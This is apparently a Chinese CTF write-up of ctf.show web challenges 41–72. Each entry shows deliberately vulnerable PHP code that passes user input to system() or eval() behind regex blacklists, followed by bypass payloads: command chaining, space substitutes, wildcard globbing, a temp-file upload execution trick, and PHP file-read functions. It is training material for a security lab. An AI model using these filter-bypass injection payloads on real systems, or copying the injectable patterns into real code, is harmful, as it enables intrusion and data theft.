<h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>过滤了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0-9 a-z ^ + ~ $ [ ] &#123; &#125; &amp; - </span><br></pre></td></tr></table></figure>









<h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接运行就行，用分号隔断</p>
<p>payload：<code>?c=cat flag.php;</code></p>
<h3 id="web-43"><a href="#web-43" class="headerlink" title="web 43"></a>web 43</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>屏蔽了分号隔断</p>
<p>可以使用||这个符号的作用就是左边执行的话右边不执行</p>
<h3 id="web-44"><a href="#web-44" class="headerlink" title="web 44"></a>web 44</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了flag还有cat</p>
<p>用sort fla*</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">文件读取的方式：</span><br><span class="line">cat--由第一行开始显示内容，并将所有内容输出</span><br><span class="line">tac--从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">more-- 根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head-- 只显示头几行</span><br><span class="line">tail --只显示最后几行</span><br><span class="line">nl --类似于cat -n，显示时输出行号</span><br><span class="line">tailf-- 类似于tail -f</span><br><span class="line">vim --使用vim工具打开文本</span><br><span class="line">vi --使用vi打开文本cat 由第一行开始显示内容，并将所有内容输出</span><br></pre></td></tr></table></figure>





<h3 id="web-45"><a href="#web-45" class="headerlink" title="web 45"></a>web 45</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了空格</p>
<p>空格用%09代替即可绕过</p>
<h3 id="web-46"><a href="#web-46" class="headerlink" title="web 46"></a>web 46</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了$符号以及*还有数字</p>
<p>%09会进行二次编码所以不用担心数字过滤</p>
<p>还有别的绕过方法如${IFS}但是这里过滤了$符号</p>
<p><code>&lt;&gt;,&lt;,$IF$9</code>但在这里好像都不行</p>
<h3 id="web-47"><a href="#web-47" class="headerlink" title="web 47"></a>web 47</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了<code>more less head sort tail</code></p>
<p>可以用tac，具体其他命令44写了</p>
<h3 id="web-48"><a href="#web-48" class="headerlink" title="web 48"></a>web 48</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了<code>sed cut awk strings od curl</code></p>
<p>无影响</p>
<h3 id="web-49"><a href="#web-49" class="headerlink" title="web 49"></a>web 49</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了%用&lt;绕过</p>
<p><code>?c=tac&lt;fla&quot;&quot;g.php||</code></p>
<h3 id="web-50"><a href="#web-50" class="headerlink" title="web 50"></a>web 50</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了tab还有&amp;</p>
<p>一样绕</p>
<h3 id="web-51"><a href="#web-51" class="headerlink" title="web 51"></a>web 51</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>tac也过滤了但是nl没有过滤</p>
<p>替换成nl，vi都行</p>
<h3 id="web-52"><a href="#web-52" class="headerlink" title="web 52"></a>web 52</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在<code>&lt;&gt;</code>也被过滤了但是$符号又放出来了</p>
<p>不过这题的flag在根目录下</p>
<h3 id="web-53"><a href="#web-53" class="headerlink" title="web 53"></a>web 53</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = system(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了wget</p>
<p>直接执行系统命令</p>
<p>payload</p>
<p><code>c=nl$&#123;IFS&#125;fla&quot;&quot;g.php</code></p>
<h3 id="web-54"><a href="#web-54" class="headerlink" title="web 54"></a>web 54</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>;|cat|flag| |[0-9]|\ |more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|nl|scp|rm</code></p>
<p>被过滤的参数</p>
<p>不能出现相连字母，所以flag.php可以用？代替f???????</p>
<p>最后vi输出或者是/bin/后面接过滤参数bin是命令目录</p>
<h3 id="web-55"><a href="#web-55" class="headerlink" title="web 55"></a>web 55</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了所有小写字母</p>
<p>这里需要构造上传，更改一下上传脚本，并且构造poc执行命令</p>
<p><code>?c=.+/???/????????[@-[]</code></p>
<p>[@-[]是linux下面的通配符，匹配的是大写字母</p>
<p>然后在上传文件里面更改添加sh命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">！/bin/sh</span></span><br><span class="line">ls</span><br></pre></td></tr></table></figure>

<p>就可以直接执行命令。</p>
<p>附构造上传脚本：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="web-56"><a href="#web-56" class="headerlink" title="web 56"></a>web 56</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>额外过滤了数字</p>
<p>也可以用上面的方法</p>
<h3 id="web-57"><a href="#web-57" class="headerlink" title="web 57"></a>web 57</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    flag在<span class="number">36</span>.php中</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>额外过滤了上面的方法</p>
<p>涉及到了linux的命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;_&#125; =<span class="string">&quot;&quot;</span> //返回上一次命令</span></span><br><span class="line"><span class="meta">$</span><span class="bash">((<span class="variable">$&#123;_&#125;</span>))=0</span></span><br><span class="line"><span class="meta">$</span><span class="bash">((~$((<span class="variable">$&#123;_&#125;</span>))))=-1</span></span><br><span class="line">payload：</span><br><span class="line"><span class="meta">$</span><span class="bash">((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(())))$((~$(())))$((~$(())))))))</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>构成-36取反就好了</p>
<h3 id="web-58"><a href="#web-58" class="headerlink" title="web 58"></a>web 58</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">突破禁用命令的方法：</span><br><span class="line">1、通过复制，重命名读取php文件内容		函数：copy、rename</span><br><span class="line">2、单一函数读文件内容：			  函数：file_get_contents()[搭配echo]		readfile()  	file()[搭配peint_r]</span><br><span class="line">3、通过fopen读文件内容：				</span><br><span class="line">函数：</span><br><span class="line">fread()		用法：$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fread($a,&quot;1000&quot;);          </span><br><span class="line">fgets()			 $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125;</span><br><span class="line">fgetc()			 $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125;</span><br><span class="line">fgetss()		 $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetss($a);echo $line;&#125;//php7.3后无法使用</span><br><span class="line">fgetcsv()		 $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);print_r($line);&#125;</span><br><span class="line">gpassthru()		 $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fpassthru($a); </span><br><span class="line">4、高亮：		函数：	show_source()	highlight_file()</span><br><span class="line">5、flag不在flag.php中，遍历目录：		函数：		scandir() 	opendir()</span><br><span class="line">6、flag是txt直接包含：		函数： 	include()		require()</span><br><span class="line">7、绕过之前的正则：在后面接exit();</span><br><span class="line">8、绕过open_basedir：   函数：</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是禁用了system好像，可以用highlight_file()绕过</p>
<p>也可以用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">readfile(&quot;flag.php&quot;);        </span><br></pre></td></tr></table></figure>



<h3 id="web-59"><a href="#web-59" class="headerlink" title="web 59"></a>web 59</h3><p>同样的数据</p>
<p>也没有过滤highlight_file()</p>
<p>也可以：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print_r(file(&quot;flag.php&quot;)); </span><br></pre></td></tr></table></figure>

<h3 id="web-60"><a href="#web-60" class="headerlink" title="web 60"></a>web 60</h3><p>见web58</p>
<p>也可以<code>（rename）copy(&quot;flag.php&quot;,&quot;flag.txt&quot;)</code>访问</p>
<h3 id="web-61-65"><a href="#web-61-65" class="headerlink" title="web 61-65"></a>web 61-65</h3><p>高亮</p>
<h3 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h3><p>使用高亮发现flag不在这里，使用目录遍历</p>
<p><code>print_r(scandir(&#39;.&#39;));</code></p>
<p>发现flag在根目录下的flag.txt中</p>
<p>然后用高亮显示</p>
<p><code>c=highlight_file(&#39;/flag.txt&#39;);</code></p>
<h3 id="web-67"><a href="#web-67" class="headerlink" title="web 67"></a>web 67</h3><p><code>print_r</code>被禁，用var_dump代替</p>
<h3 id="web-68"><a href="#web-68" class="headerlink" title="web 68"></a>web 68</h3><p>发现高亮被过滤，但是可以继续遍历目录</p>
<p>flag还是在根目录下</p>
<p>因为他是txt文件，直接include这个文件他就会直接在网页中显示</p>
<h3 id="web-69-70"><a href="#web-69-70" class="headerlink" title="web 69-70"></a>web 69-70</h3><p> <code>var_dump</code>被禁用,可以用<code>var_export</code>替代</p>
<h3 id="web-71"><a href="#web-71" class="headerlink" title="web 71"></a>web 71</h3><p>使用上面方法的时候发现，全是问号</p>
<p>但是遍历根目录的时候可以发现????.???猜测是flag.txt</p>
<p>读取这个方法也全是问号，想到用utf-8编码看一下是不是编码问题</p>
<p>查看源代码发现下面有一层过滤</p>
<p>可以用exit();跳过这层过滤</p>
<h3 id="web-72"><a href="#web-72" class="headerlink" title="web 72"></a>web 72</h3>]]></content>
      <tags>
        <tag>ctf-show</tag>
      </tags>
  </entry>
</search>
